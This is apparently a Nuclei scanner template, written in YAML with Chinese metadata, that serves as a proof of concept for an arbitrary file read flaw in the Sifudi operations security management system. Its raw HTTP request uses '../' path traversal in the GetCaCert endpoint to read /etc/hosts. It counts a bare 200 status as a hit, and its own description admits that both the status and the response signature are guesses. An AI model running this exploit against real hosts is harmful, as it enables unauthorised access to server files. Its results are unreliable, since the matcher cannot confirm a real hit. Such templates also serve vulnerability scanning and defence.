id: poc-a1169c344352a6c6bb05
info:
  name: 思福迪运维安全管理系统GetCaCert存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /bhost/GetCaCert?a1=../../../../../etc/hosts HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Accept: gzip

    Accept-Encoding: gzip, deflate, br

    Content-Length: 0'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
